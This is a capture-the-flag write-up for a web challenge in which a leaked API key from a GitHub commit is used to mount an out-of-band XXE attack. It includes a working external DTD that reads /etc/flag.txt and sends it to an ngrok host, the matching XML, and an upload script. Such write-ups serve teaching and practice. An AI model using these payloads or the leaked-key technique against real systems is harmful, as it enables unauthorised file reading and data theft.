# Webi 2
```
You encounter an API that's still under development. Secret file is located in /etc/flag.txt, can you find out its content?
https://webi2.challenge.fi
```

Doing some recon will reveal us some useful information from specific endpoints:
- /api/:
    "This site is supposed to return APIKEY but it's not yet implemented.. For devs only for now!"
    "Senior dev said to read what .gitignore is before pushing the repo to github (I'll check this one later, gotta push it now!)"
- /info/:
    "Welcome to opensource project called challenge_multipurpose_api! The project is still in progress, but we hope you enjoy your stay!"

This information allows us to find out that the repository can be found on github [here](https://github.com/testingstuff0/generational-weather-xml-interface), and looking through the latest commit "deleted secret" allows us to get the API key `b13a6dc33a1e7819ce23a6`.

Most of the API endpoints aren't implemented, and only two endpoints seem relevant, `/save_xml/` and `/files/`, which are defined [here](https://github.com/testingstuff0/generational-weather-xml-interface/blob/f70ae735fd3609a8a94d0157ff9dfb9f6a4bf6ee/challenge2/api_stuff/views.py#L48-L145).

We can parse our own XML and upload DTDs, hinting that this is XXE. As we aren't able to get the response from the uploaded XML file, this is specifically Out-Of-Band XXE.

`payload.dtd`:
```xml
<!ENTITY % file SYSTEM "file:///etc/flag.txt">
<!ENTITY % eval "<!ENTITY exfil SYSTEM 'http://[...].eu.ngrok.io/?flag=%file;'>">
%eval;
```

`payload.xml`:
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo SYSTEM "http://[...].eu.ngrok.io/payload.dtd">
<foo>&exfil;</foo>
```

`exploit.py`:
```py
import requests

res = requests.post('https://webi2.challenge.fi/files/', headers = {
    'APIKEY': 'b13a6dc33a1e7819ce23a6',
}, files = {
    'file': open('payload.xml', 'rb'),
})
assert res.status_code == 200
```

Then we just need to setup the actual webserver which is extremely easy with python and ngrok:
```bash
└─$ ngrok http --scheme=http 8000
└─$ python3 -m http.server
```

Then running `exploit.py` will show in ngrok's dashboard us receiving the query param `R0VOWns2VU00YjRtUVJjdTNXVVlCfQ`, which decodes to the flag: `GENZ{6UM4b4mQRcu3WUYB}`.